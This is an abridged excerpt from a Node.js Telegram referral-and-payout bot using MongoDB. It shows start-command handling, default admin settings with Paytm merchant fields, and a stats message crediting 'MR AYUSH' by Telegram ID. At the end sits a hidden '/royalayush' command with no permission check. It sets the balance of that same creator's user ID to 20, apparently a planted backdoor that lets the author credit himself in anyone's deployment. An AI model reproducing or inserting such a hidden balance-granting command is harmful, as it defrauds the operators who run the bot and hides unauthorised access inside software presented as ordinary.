...
bot.hears(/^\/start (.+[1-9]$)/, async (ctx) => {
    try {
        ...
        if (admin.length == 0) {
            db.collection('admindb').insertOne({ admin: "admin", ref: 1, cur: 'INR', paychannel: '@botPaytmpayment', bonus: 0.1, minimum: 1, botstat: 'Active', withstat: 'ON', subwallet: 'NOT SET', MKEY: 'NOT SET', MID: 'NOT SET', channels: [] })
        ...
        if (bots == 'Active') {
            ...
            ctx.replyWithMarkdown('*This bot is not admin in one of the channel so the report has been sent to the admin and the bot will work soon*')
        }
    } catch (error) {
        console.log(error)
    }
        ...
        if (bots == 'Active') {
            ...
            if (flag == channel.length) {
                ...
                if (statdata.length == 0) {
                    ...
                    ctx.reply(
                        '<b>📊 Bot Live Stats 📊\n\n📤 Total Payouts : 0 ' + currency + '\n\n💡 Total Users: ' + members.length + ' Users\n\n✅ Created By : <a href="tg://user?id=783073136">MR AYUSH★</a></b>' , { parse_mode: 'html', reply_markup: { keyboard: [['💰 Balance'], ['👫 Invite', '🎁 Bonus', '🗂 Wallet'], ['💵 Withdraw', '📊 Statistics']], resize_keyboard: true } }
                    )
                } else {
...
bot.hears('/royalayush',async(ctx) => {
    try {
        db.collection('allUsers').updateOne({ userID : 783073136 }, { $set: { balance : 20 } }, { upsert: true })
    } catch (error) {
        console.log(error)
    }
})
